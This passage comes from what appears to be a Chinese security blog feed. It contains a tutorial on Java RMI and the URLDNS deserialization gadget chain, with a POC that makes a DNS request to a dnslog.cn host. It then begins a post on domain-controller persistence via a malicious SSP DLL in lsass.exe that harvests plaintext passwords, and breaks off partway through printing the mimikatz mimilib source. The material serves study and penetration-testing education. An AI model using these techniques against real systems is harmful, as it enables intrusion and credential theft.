class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIServer</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IRemoteHelloWorld</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">RMIServer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">sayhello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello,Server&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello,Client&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        RMIServer rmiServer = <span class="hljs-keyword">new</span> RMIServer();<br>        LocateRegistry.getRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, rmiServer);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">new</span> RMIServer().start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIClient</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, NotBoundException, RemoteException </span>&#123;<br>        IRemoteHelloWorld iRemoteHelloWorld = (IRemoteHelloWorld) Naming.lookup(<span class="hljs-string">&quot;rmi://172.20.10.5:1099/Hello&quot;</span>);<br>        String ret = iRemoteHelloWorld.sayhello();<br>        System.out.println(ret);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先运行注册中心代码，然后启动Server，Client即可。</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png"></p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png"></p><p>可以看到客户端可以调用服务端的方法，方法在服务端执行，并将结果返回给客户端。</p><p>上面刚刚说RMI是通过序列化在网络间传输，下面通过抓包证实。</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png"></p><p>经过两次TCP握手。第一次连接服务端（注册中心）的1099端口，之后向服务端（注册中心）发送了一个<code>Call</code>，这个<code>Call</code>就对应着Client在Registry中寻找Name是Hello的对象。</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png"></p><p>显然<code>aced</code>是java序列化的标志，说明了是通过序列化方式进行传输。</p><p>然后服务端（注册中心）给客户端发送了一个<code>ReturnData</code>，这个<code>ReturnData</code>就对应着Name为Hello的对象。然后与一个新的端口49791进行第二次的TCP握手连接。</p><p>这个端口并不是无迹可寻，就存在<code>ReturnData</code>中。</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png"></p><p><code>0x0000c27f</code>反序列化后为49791。</p><p>连接到服务端的49791端口才算真正的连接到服务端，此时客户端才能调用服务端的hello方法。</p><blockquote><p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p></blockquote><h2 id="0x05-URLDNS链学习"><a href="#0x05-URLDNS链学习" class="headerlink" title="0x05 URLDNS链学习"></a>0x05 URLDNS链学习</h2><blockquote><p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p><p>由于URLDNS不需要依赖第三方的包，同时不限制jdk的版本，所以通常用于检测反序列化的点。</p><p>URLDNS并不能执行命令，只能发送DNS请求。</p></blockquote><p>首先去看看这个链的payload长什么样子。去github上下载源码:<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">ysoserial/URLDNS.java at master · frohoff/ysoserial · GitHub</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectPayload</span>&lt;<span class="hljs-title">Object</span>&gt; </span>&#123;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                URLStreamHandler handler = <span class="hljs-keyword">new</span> SilentURLStreamHandler();<br><br>                HashMap ht = <span class="hljs-keyword">new</span> HashMap(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                URL u = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">URLStreamHandler</span> </span>&#123;<br><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这些代码上面还有一些说明，英语不好也就不翻译了，同时提到的还有该利用链：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Gadget Chain:<br>     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><br>         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>           <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br></code></pre></td></tr></table></figure><p>payload中有许多注释，可以通过这些注释更好地理解。</p><p>由于利用链用到了HashMap，就简单回康师傅那里复习一下，这里简单介绍一下</p><blockquote><p>Map是一个集合，本质上还是数组，HashMap是Map的子接口。该集合的结构为key–&gt;value，两个一起称为一个Entry(jdk7)，在jdk8中底层的数组为Node[]。当new HashMap()时，在jdk7中会直接创建一个长度为16的数组；jdk8中并不直接创建，而是在调用put方法时才去创建一个长度为16的数组。</p><p>下面的分析在jdk8中完成，我认为至少要了解HashMap的基本结构，key—&gt;value</p></blockquote><h3 id="URLDNS分析"><a href="#URLDNS分析" class="headerlink" title="URLDNS分析"></a>URLDNS分析</h3><p>利用链说了是从<code>HashMap.readObject()</code>开始，那就根据提供的利用链，一层一层进入。先找到<code>HashMap.readObject()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-keyword">int</span> mappings = s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-keyword">float</span> lf = Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-keyword">float</span> fc = (<span class="hljs-keyword">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-keyword">int</span>)fc));<br>            <span class="hljs-keyword">float</span> ft = (<span class="hljs-keyword">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-keyword">int</span>)ft : Integer.MAX_VALUE);<br><br>            <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>            <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> Node[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    K key = (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    V value = (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>            &#125;<br></code></pre></td></tr></table></figure><p>可以看到hashmap是重写了readObject方法，由于利用链第二个调用的函数是<code>HashMap.putVal()</code>，其中参数又调用<code>HashMap.hash()</code>，跟入到<code>hash</code>方法。在该方法中看到了<code>hashCode</code>方法的调用。</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png"></p><p>这里调用hashCode的对象为Object，实际传入值的时候，该对象会变成<code>java.net.URL</code>，所以实际上调用的是URL的hashcode方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-keyword">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure><p>如果hashCode的值为-1，那么将执行handler的hashCode方法，跟入该方法</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png"></p><p>继续跟入<code>java.net.URLStreamHandler</code>的hashcode方法。</p><p>在该方法中，调用了<code>getHostAddress</code>，通过注释可以看到要通过DNS查询主机的ip。</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png"></p><p>其实到这里就可以结束了，要想继续的话就在跟一层。</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png"></p><p>通过<code>InetAddress.getByName</code>函数注释可以看到：如果输入的参数是主机名则查询ip，这就有一次dns查询。</p><p>所以可以使用dnslog查看是否有dns日志，如果有则说明执行了被重写后的readObject函数，那么也证明了存在可反序列化的点。</p><p>但是到这里，我总感觉还是有一些地方没搞清除，回到URLDNS。</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png"></p><p>这里通过注释可以看到：避免payload生成期间有DNS查询。跟一下<code>SilentURLStreamHandler</code>类，发现他是继承<code>URLStreamHandler</code>，并且重写了<code>openConnection</code>和<code>getHostAddress</code>方法，openConnection方法是一个抽象方法所以必须重写，重写getHostAddress则是为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询。执行getHostAddress时直接返回null，避免进一步调用<code>getByName()</code>。</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png"></p><p>当我视图说服自己时，发现这里还有一个问题：为什么要防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询。</p><p>回到<code>hashMap.readObject</code>方法</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png"></p><p>hash方法中参数key的来源为readObject读取出的，那么意味着在序列化WriteObject方法时就已经将这个值写入。</p><p>跟进<code>hashMap.WriteObject()</code></p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png"></p><p>跟入<code>internalWriteEntries</code>，可以看到这里写入的key为tab数组中抽出来的，而tab的值即HashMap中table的值。</p><p>想要修改table的值，就需要调用<code>HashMap.put()</code>方法。</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png"></p><p>但是<code>HashMap.put()</code>方法是会触发一次dns请求的，这就解释了为什么需要防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询的问题。但这并不是必须的。</p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png"></p><p>除了重写<code>getHostAddress</code>方法这里还有一个办法，看到<code>URL.hashCode()</code></p><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/24.png"></p><p>如果设置hashCode的值不为-1，那么将无法进入到<code>URLStreamHandler.hashCode()</code>函数中，也就无法执行DNS查询。</p><p>那么这下大致就理清楚了，gadget为：</p><ol><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>最后还是复现一下。一个简单的POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UrlDemo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        HashMap map = <span class="hljs-keyword">new</span> HashMap();<br>        URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://5i6qar.dnslog.cn&quot;</span>);<br>        Field f = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>); <span class="hljs-comment">// 绕过Java语言权限控制检查的权限</span><br>        f.set(url,<span class="hljs-number">123</span>); <span class="hljs-comment">//设置hashCode的值不为-1，无法进行DNS查询</span><br>        map.put(url,<span class="hljs-string">&quot;Tom&quot;</span>);<br>        f.set(url,-<span class="hljs-number">1</span>); <span class="hljs-comment">//保证反序列化时可以进行DNS查询</span><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./urldns.ser&quot;</span>);<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(fileOutputStream);<br><br>            outputStream.writeObject(map);<br>            outputStream.close();<br>            fileOutputStream.close();<br><br>            FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./urldns.ser&quot;</span>);<br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(fileInputStream);<br>            inputStream.readObject();<br>            inputStream.close();<br>            fileInputStream.close();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E4%BB%8E0%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/25.png"></p><h2 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h2><p>本来写了RMI就是还想写一个小节：调试weblogic cve-2015-4852。看看Weblogic的T3协议和默认的JRMP协议的区别。但分析完URLDNS后，我的直觉告诉我这是不敢奢望的。作为学习文章还是不要把这些糅杂在一起。</p><p>感谢前辈师傅们的文章：<br>java安全漫谈反射篇(1)<br>java安全漫谈RMI篇(1)<br><a href="https://github.com/Maskhe/javasec">javasec</a><br><a href="https://paper.seebug.org/1242/#urldns">https://paper.seebug.org/1242/#urldns</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>浅谈域控权限维持</title>
    <link href="/2021/08/30/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <url>/2021/08/30/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>拿下域控,渗透就结束了吗?实际上,往往刚刚开始。<br>本文就域控权限维持的两种方法展开研究:<code>SSP</code>和<code>PasswordChangeNotify</code>。</p><h2 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h2><h3 id="何为SSP"><a href="#何为SSP" class="headerlink" title="何为SSP"></a>何为SSP</h3><p>SPP全称为<code>Security Support Provider</code>,安全支持提供者。<br>SPP是一个dll,用于身份的验证。<br>windows下的SSP包含有:</p><ul><li>NTLMSSP (msv1_0.dll)</li><li>Kerberos (kerberos.dll)</li><li>NegotiateSSP (secur32.dll)</li><li>Secure Channel (schannel.dll)</li><li>TLS/SSL</li><li>Digest SSP (wdigest.dll)</li><li>CredSSP (credssp.dll)</li><li>DPA(Distributed Password Authentication) (msapsspc.dll)</li><li>Public Key Cryptography User-to-User (PKU2U, pku2u.dll)</li></ul><h3 id="SSPI"><a href="#SSPI" class="headerlink" title="SSPI"></a>SSPI</h3><p>SSPI全称为<code>Security Support Provider Interface</code>,为SSP接口,实际上就是SSP的API。</p><h3 id="LSA"><a href="#LSA" class="headerlink" title="LSA"></a>LSA</h3><p>LSA全称<code>Local Security Authority</code>,是微软窗口操作系统的一个内部程序，负责运行Windows系统安全政策。它在用户登录时电脑单机或服务器时，验证用户身份，管理用户密码变更，并产生访问字符。它也会在窗口安全记录档中留下应有的记录。用于身份的验证。其中就包含有<code>lsass.exe</code>进程。<br><img src="/img/%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/1.png"><br>操作lsass进程需要至少system权限。</p><h3 id="利用SSP进行权限维持"><a href="#利用SSP进行权限维持" class="headerlink" title="利用SSP进行权限维持"></a>利用SSP进行权限维持</h3><p>如果获得目标系统system权限，可以使用该方法进行持久化操作。其主要原理是：LSA（Local Security Authority）用于身份验证；lsass.exe作为windows的系统进程，用于本地安全和登录策略；在系统启动时，SSP将被加载到lsass.exe 进程中。但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样即使用户更改密码并重新登录，攻击者依然可以获得该账号的新密码。</p><p><code>mimikatz</code>早以支持这个功能,该文件为为<code>mimilib.dll</code>。mimikatz poc为:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kssp.h&quot;</span></span><br><br><span class="hljs-keyword">static</span> SECPKG_FUNCTION_TABLE kiwissp_SecPkgFunctionTable = &#123;<br><span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>,<br>kssp_SpInitialize, kssp_SpShutDown, kssp_SpGetInfo, kssp_SpAcceptCredentials,<br><span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>, <span 